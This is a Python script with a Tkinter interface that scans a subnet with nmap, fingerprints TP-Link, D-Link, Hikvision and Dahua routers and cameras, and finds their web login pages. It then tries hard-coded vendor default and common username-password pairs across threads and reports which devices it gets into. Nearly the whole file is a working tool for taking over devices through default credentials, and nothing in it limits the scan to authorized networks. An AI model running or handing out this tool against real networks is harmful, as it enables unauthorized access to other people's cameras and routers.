import requests
from requests.auth import HTTPBasicAuth
import nmap
import threading
from queue import Queue
import tkinter as tk
from tkinter import scrolledtext, messagebox, simpledialog

# Vendor-based credentials
VENDOR_CREDS = {
    'tplink': [('admin', 'admin'), ('admin', 'tplink123')],
    'dlink': [('admin', 'admin'), ('admin', 'dlink123')],
    'hikvision': [('admin', '12345'), ('admin', 'hikvision')],
    'dahua': [('admin', 'admin'), ('admin', 'dahua123')]
}

COMMON_CREDS = [
    ('admin', 'admin'), ('admin', '1234'), ('admin', 'password'),
    ('root', 'root'), ('user', 'user'), ('admin', '12345')
]

LOGIN_PATHS = ['/', '/admin', '/login', '/setup', '/cgi-bin', '/webadmin']

device_queue = Queue()

# GUI Functions
def log_message(message):
    """Log messages to the GUI's text area."""
    output_text.config(state=tk.NORMAL)
    output_text.insert(tk.END, message + "\n")
    output_text.yview(tk.END)
    output_text.config(state=tk.DISABLED)

def find_devices_in_network(subnet):
    """Scan the network for active devices."""
    scanner = nmap.PortScanner()
    log_message(f"Scanning {subnet} for active devices...")
    scanner.scan(hosts=subnet, arguments='-sn')

    devices = [host for host in scanner.all_hosts() if scanner[host].state() == 'up']
    log_message(f"Found {len(devices)} active devices.")
    return devices

def detect_login_page(ip):
    """Try to detect the login page of a device."""
    for path in LOGIN_PATHS:
        url = f"http://{ip}{path}"
        try:
            response = requests.get(url, timeout=5)
            if response.status_code in [200, 401]:
                log_message(f"Login page detected: {url}")
                return url
        except requests.RequestException:
            continue
    log_message(f"No login page detected for {ip}.")
    return None

def fingerprint_device(ip):
    """Identify device type based on response headers."""
    try:
        response = requests.get(f"http://{ip}/", timeout=5)
        server = response.headers.get('Server', '').lower()
        auth_header = response.headers.get('WWW-Authenticate', '').lower()

        if 'tplink' in server:
            return 'tplink'
        elif 'dlink' in server:
            return 'dlink'
        elif 'hikvision' in auth_header:
            return 'hikvision'
        elif 'dahua' in auth_header:
            return 'dahua'
        else:
            return None
    except requests.RequestException:
        return None

def attempt_login(ip, login_url, creds):
    """Attempt login using provided credentials."""
    for username, password in creds:
        try:
            response = requests.get(login_url, auth=HTTPBasicAuth(username, password), timeout=5)
            if response.status_code == 200:
                log_message(f"Success: {username}:{password} works for {ip}!")
                return True
        except requests.RequestException:
            continue
    log_message(f"Failed to login to {ip}.")
    return False

def attack_device(ip):
    """Perform fingerprinting, login detection, and login attempts."""
    vendor = fingerprint_device(ip)
    login_url = detect_login_page(ip)

    if login_url:
        creds = VENDOR_CREDS.get(vendor, COMMON_CREDS)
        if attempt_login(ip, login_url, creds):
            log_message(f"Access granted for {ip}!")
        else:
            log_message(f"No valid credentials found for {ip}.")
    else:
        log_message(f"No login page found for {ip}.")

def threaded_scanner(subnet):
    """Scan and attack devices in the subnet."""
    devices = find_devices_in_network(subnet)
    if not devices:
        log_message("No devices found.")
        return

    for ip in devices:
        device_queue.put(ip)

    threads = []
    for _ in range(5):
        thread = threading.Thread(target=device_worker)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def device_worker():
    """Worker thread to process devices."""
    while not device_queue.empty():
        ip = device_queue.get()
        attack_device(ip)
        device_queue.task_done()

def start_scan():
    """Start the scan when the button is clicked."""
    subnet = subnet_entry.get()
    if not subnet:
        messagebox.showerror("Error", "Please enter a subnet.")
        return

    log_message(f"Starting scan for subnet: {subnet}")
    threading.Thread(target=threaded_scanner, args=(subnet,)).start()

def show_login():
    """Show a dialog to enter credentials."""
    ip = simpledialog.askstring("Input", "Enter the IP address:")
    if ip:
        creds = simpledialog.askstring("Input", "Enter credentials (username:password, separated by commas):")
        if creds:
            credentials = [tuple(cred.split(':')) for cred in creds.split(',')]
            login_url = detect_login_page(ip)
            if login_url:
                for username, password in credentials:
                    if attempt_login(ip, login_url, [(username, password)]):
                        messagebox.showinfo("Success", f"Login successful for {username}@{ip}")
                        return
                messagebox.showwarning("Failure", f"Login failed for {ip} with provided credentials.")

# GUI Setup
root = tk.Tk()
root.title("Network Scanner & Login Tester")

frame = tk.Frame(root)
frame.pack(padx=10, pady=10)

tk.Label(frame, text="Enter Subnet (e.g., 192.168.1.0/24):").grid(row=0, column=0, padx=5, pady=5)
subnet_entry = tk.Entry(frame, width=30)
subnet_entry.grid(row=0, column=1, padx=5, pady=5)

scan_button = tk.Button(frame, text="Start Scan", command=start_scan)
scan_button.grid(row=1, column=0, columnspan=2, pady=10)

login_button = tk.Button(frame, text="Login Manually", command=show_login)
login_button.grid(row=2, column=0, columnspan=2, pady=5)

output_text = scrolledtext.ScrolledText(root, width=80, height=20, state=tk.DISABLED)
output_text.pack(padx=10, pady=10)

# Start the GUI event loop
root.mainloop()

root.mainloop()

